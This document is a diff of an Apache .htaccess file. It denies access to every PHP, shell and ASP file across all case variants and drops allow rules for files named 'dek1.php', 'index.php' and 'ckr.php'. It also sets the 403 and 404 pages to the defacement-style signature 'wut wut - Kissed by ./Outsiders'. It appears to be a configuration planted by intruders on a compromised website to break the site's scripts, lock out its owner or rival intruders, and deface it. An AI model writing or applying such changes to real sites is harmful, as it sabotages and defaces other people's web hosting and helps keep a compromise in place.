@@ -1,50 +1,50 @@
 <Files *.ph*>
     Order Deny,Allow
-    Allow from all
+    Deny from all
 </Files>
 <Files *.Ph*>
     Order Deny,Allow
-    Allow from all
+    Deny from all
 </Files>
 <Files *.pH*>
     Order Deny,Allow
-    Allow from all
+    Deny from all
 </Files>
 <Files *.PH*>
     Order Deny,Allow
-    Allow from all
+    Deny from all
 </Files>
 <Files *.sh*>
     Order Deny,Allow
-    Allow from all
+    Deny from all
 </Files>
 <Files *.Sh*>
     Order Deny,Allow
-    Allow from all
+    Deny from all
 </Files>
 <Files *.sH*>
     Order Deny,Allow
-    Allow from all
+    Deny from all
 </Files>
 <Files *.SH*>
     Order Deny,Allow
-    Allow from all
+    Deny from all
 </Files>
 <Files *.AS*>
     Order Deny,Allow
-    Allow from all
+    Deny from all
 </Files>
 <Files *.As*>
     Order Deny,Allow
-    Allow from all
+    Deny from all
 </Files>
 <Files *.aS*>
     Order Deny,Allow
-    Allow from all
+    Deny from all
 </Files>
 <Files *.as*>
     Order Deny,Allow
-    Allow from all
+    Deny from all
 </Files>
 <FilesMatch "\.(jpg|jpeg|png|gif|svg|bmp|ico|webp|heic)$">
     Order Deny,Allow
@@ -58,6 +58,8 @@
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "^(dek1.php|index.php|ckr.php)$">
-    Allow from all
+<FilesMatch "^(ckr.php)$">
+    Deny from all
 </FilesMatch>
+ErrorDocument 403 "wut wut - Kissed by ./Outsiders"
+ErrorDocument 404 "wut wut - Kissed by ./Outsiders"
